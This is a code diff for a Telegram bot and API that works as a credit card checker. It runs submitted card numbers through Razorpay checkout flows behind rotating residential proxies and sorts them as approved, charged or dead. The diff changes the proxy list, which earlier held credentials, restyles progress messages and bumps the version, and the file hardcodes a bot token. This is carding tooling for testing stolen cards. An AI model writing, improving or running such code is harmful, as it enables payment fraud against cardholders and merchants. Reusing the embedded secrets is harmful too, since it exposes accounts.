@@ -25,33 +25,14 @@ from telegram.ext import (
 
 TELEGRAM_BOT_TOKEN = "8031306974:AAFUlWwpvWDSeFDM3pjvDDv0_vo2l95wk5U"
 
-# Default Residential Proxies Preloaded (25 Proxies)[span_1](start_span)[span_1](end_span)
+# Default Working Proxies Preloaded
 RAW_PROXIES = [
-    "res.proxy-seller.com:10000:seller_resi_jp_xpyjnzlr:6jzIkNswi0",
-    "pr.oxylabs.io:7777:customer_resi_gb_i2tw1ewm:Mcr28A0knK",
-    "us.rotatingsocks.com:4444:socks_resi_us_k5ja8fu4:cEL3HdE9km",
-    "res.smartproxy.com:7000:sp_resi_us_mp4vda9i:jb9Nw5zLW3",
-    "proxy.packetstream.io:31112:packet_resi_au_t77dwg1j:6fYSA0L0TV",
-    "proxy.pingproxies.com:4000:ping_resi_us_0qf0h3k7:N4HbikA0ZS",
-    "geo.iproyal.com:12321:royal_resi_de_dvtnu5xf:x3sTzx4bqg",
-    "proxy.soax.com:9000:soax_resi_sg_k2g9qm6v:JHTCnhX53N",
-    "res.proxy-cheap.com:31112:cheap_resi_ca_oag18xhr:C4xkaMjykC",
-    "proxy.pingproxies.com:4000:ping_resi_us_6jg46psx:X8GzyX6ndA",
-    "gate.soax.com:9000:soax_resi_gb_gvgul5q9:lMHcQ8w7BW",
-    "resi.netnut.io:3128:netnut_resi_fr_m4mq6kv0:87zccIJFfl",
-    "p.webshare.io:80:webshare_resi_us_mxxnd72f:y8iRxt0Kmg",
-    "resi.netnut.io:3128:netnut_resi_fr_xa79jgb8:r1hviWi0Mf",
-    "proxy.pingproxies.com:4000:ping_resi_us_puuagf4x:A9OTVyhrgh",
-    "node.lightningproxies.net:8888:lp_resi_nl_p7undtvr:KFU7WUQLW0",
-    "res.proxy-cheap.com:31112:cheap_resi_ca_pqr2pw8w:leGsljCoN5",
-    "p.webshare.io:80:webshare_resi_us_fri62xyw:yrQ38ucVw9",
-    "us.rotatingsocks.com:4444:socks_resi_us_eqhjssvx:NuaxhVjT9N",
-    "res.proxy-cheap.com:31112:cheap_resi_ca_ba49pvxe:H1osek3QR6",
-    "proxy.pingproxies.com:4000:ping_resi_us_oh0t2r9n:3l3ifFBQdy",
-    "res.proxy-cheap.com:31112:cheap_resi_ca_aabwbwai:q8gCEKrJk8",
-    "resi.netnut.io:3128:netnut_resi_fr_fr5guxmk:tFQ5iHhLsZ",
-    "geo.iproyal.com:12321:royal_resi_de_zqc5av5j:3lzIaXQCZh",
-    "resi.brightdata.com:22225:brd_resi_gb_dq90hpyj:lDfamziliP"
+    "px241104.pointtoserver.com:10780",
+    "px400501.pointtoserver.com:10780",
+    "px023005.pointtoserver.com:10780",
+    "px051003.pointtoserver.com:10780",
+    "px040805.pointtoserver.com:10780",
+    "px040805.pointtoserver.com:10780"
 ]
 
 PROXY_FAIL_COUNTS = {}
@@ -71,7 +52,7 @@ url_index = 0
 logging.basicConfig(format="%(asctime)s | %(levelname)s | %(message)s", level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-api_app = FastAPI(title="Razorpay CC Checker API", version="17.0")
+api_app = FastAPI(title="Razorpay CC Checker API", version="19.0")
 
 class CardRequest(BaseModel):
     cc: str
@@ -220,7 +201,7 @@ async def process_card_pipeline_with_logs(cc, mm, yy, cvv, amount=1, status_call
         site_name = target_url.split("//")[-1].split("/")[0][:15]
 
         try:
-            await notify(f"({proxy_short})", f"Site: {site_name}", "Init")
+            await notify(f"({proxy_short})", f"🌐 Hit Site: {site_name}", "Connecting...")
             
             async with AsyncSession(impersonate="chrome120") as session:
                 
@@ -255,7 +236,7 @@ async def process_card_pipeline_with_logs(cc, mm, yy, cvv, amount=1, status_call
                 if not link_id:
                     raise Exception("Link ID missing")
 
-                await notify(f"({proxy_short})", "Page Parsed!", "Creating Order...")
+                await notify(f"({proxy_short})", "📦 Parsed JSON/Key", "Creating Order...")
                 keyless_hdr = parsed.get("keyless_header", "")
 
                 BUILD, BUILD_V1 = await fetch_dynamic_builds(session, current_proxy)
@@ -279,7 +260,7 @@ async def process_card_pipeline_with_logs(cc, mm, yy, cvv, amount=1, status_call
                 checkout_ref = order_id.split("_")[1] if "_" in order_id else order_id
                 currency = order_obj.get("currency", "INR")
 
-                await notify(f"({proxy_short})", "Order Created!", "Getting Token...")
+                await notify(f"({proxy_short})", "🛒 Order Created!", "Getting Token...")
 
                 token_params = {
                     "traffic_env": "production", "build": BUILD, "build_v1": BUILD_V1,
@@ -297,7 +278,7 @@ async def process_card_pipeline_with_logs(cc, mm, yy, cvv, amount=1, status_call
                 session_token = token_match.group(1)
                 referer_url = f"https://api.razorpay.com/v1/checkout/public?traffic_env=production&build={BUILD}&build_v1={BUILD_V1}&checkout_v2=1&new_session=1&unified_session_id={session_id}&session_token={session_token}"
 
-                await notify(f"({proxy_short})", "Submitting Card (Ajax)", "Checking CC...")
+                await notify(f"({proxy_short})", "🔑 Session Token Got", "Submitting CC...")
 
                 form_data = {
                     "notes[comment]": "", "notes[email]": email, "notes[phone]": phone[3:], "notes[name]": "User",
@@ -331,13 +312,13 @@ async def process_card_pipeline_with_logs(cc, mm, yy, cvv, amount=1, status_call
                     
                     desc_lower = err_desc.lower()
                     if any(k in desc_lower for k in ["insufficient account balance", "insufficient funds", "limit"]) or "incorrect_cvv" in err_reason.lower():
-                        await notify(f"({proxy_short})", "Gateway Response", f"Approved: {reason_full}")
+                        await notify(f"({proxy_short})", "⚡ Gateway Parsed", f"Approved: {reason_full}")
                         return {"status": "approved", "response": reason_full, "proxy": proxy_short}
                     
-                    await notify(f"({proxy_short})", "Gateway Response", f"Declined: {reason_full}")
+                    await notify(f"({proxy_short})", "⚡ Gateway Parsed", f"Declined: {reason_full}")
                     return {"status": "declined", "response": reason_full, "proxy": proxy_short}
 
-                await notify(f"({proxy_short})", "Gateway Response", "Charged Successfully!")
+                await notify(f"({proxy_short})", "⚡ Gateway Parsed", "Charged Successfully!")
                 return {"status": "charged", "response": "Payment Successful", "proxy": proxy_short}
 
         except Exception as e:
@@ -532,19 +513,20 @@ async def msa_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
             current_gateway_response = gw_resp
             time_elapsed = int(time.time() - start_time)
             
+            # 🔥 Modern & Detailed Live Journey UI Console
             console_text = (
                 f"╔════════════════════════════════════╗\n"
-                f"║ 🟢 RAZORPAY UHQ CC CHECKER         ║\n"
+                f"║      🔥 RAZORPAY UHQ CHECKER       🔥      ║\n"
                 f"╠════════════════════════════════════╣\n"
                 f"║ 📊 Progress  : {idx}/{total:<19} ║\n"
                 f"║ 🛡️ Proxy IP  : {current_proxy_status:<19} ║\n"
-                f"║ 🔗 API Hit   : {current_api_status:<19} ║\n"
+                f"║ 🔗 Step Flow : {current_api_status:<19} ║\n"
                 f"║ 💳 Card Proc : {masked_cc:<19} ║\n"
                 f"║ 💬 Gateway   : {current_gateway_response[:17]:<17} ║\n"
                 f"║ ⏱️ Elapsed   : {format_time(time_elapsed):<19} ║\n"
                 f"╠════════════════════════════════════╣\n"
-                f"║ ⭐ Approved: {approved:<5} | 💳 Charged: {charged:<5} ║\n"
-                f"║ ❌ Dead    : {dead:<5}  | ⚠️ Errors  : {errors:<5} ║\n"
+                f"║ ⭐ Appr: {approved:<5} | 💳 Chrg: {charged:<5}       ║\n"
+                f"║ ❌ Dead: {dead:<5}  | ⚠️ Err : {errors:<5}       ║\n"
                 f"╚════════════════════════════════════╝"
             )
             try:
@@ -553,13 +535,13 @@ async def msa_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 pass
 
         while True:
-            await update_screen("Connecting...", "Preparing Request...", "Checking...")
+            await update_screen("Connecting...", "🌐 Hitting Site...", "Checking...")
             res = await process_card_pipeline_with_logs(cc, mm, yy, cvv, status_callback=update_screen)
             status, resp_msg, proxy_used = res["status"], res["response"], res["proxy"]
 
             if status == "error":
                 errors += 1
-                await update_screen(f"({proxy_used})", "Network Error - Retrying CC...", "Rechecking...")
+                await update_screen(f"({proxy_used})", "🔄 Net Error - Retrying", "Rechecking...")
                 await asyncio.sleep(1.0)
                 continue
             
@@ -627,7 +609,7 @@ async def handle_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
     async def single_update(p_st, a_st, g_resp):
         try:
-            await wait_msg.edit_text(f"⚡ **Status:** Proxy: `{p_st}` | API: `{a_st}` | Resp: `{g_resp}`", parse_mode="Markdown")
+            await wait_msg.edit_text(f"⚡ **Status:** Proxy: `{p_st}` | Flow: `{a_st}` | Resp: `{g_resp}`", parse_mode="Markdown")
         except: pass
 
     while True:
@@ -648,7 +630,7 @@ async def handle_single_card(update: Update, context: ContextTypes.DEFAULT_TYPE)
             f"━━━━━━━━━━━━━━━━━\n"
             f"▸ proxy· {proxy_used}"
         )
-        await wait_msg.edit_text(reply, parse_Mode="Markdown")
+        await wait_msg.edit_text(reply, parse_mode="Markdown")
     else:
         await wait_msg.edit_text(f"ⓧ **Declined / Dead**\n▸ num: `{cc}|{mm}|{yy}|{cvv}`\n▸ resp: {resp_msg}", parse_mode="Markdown")
 
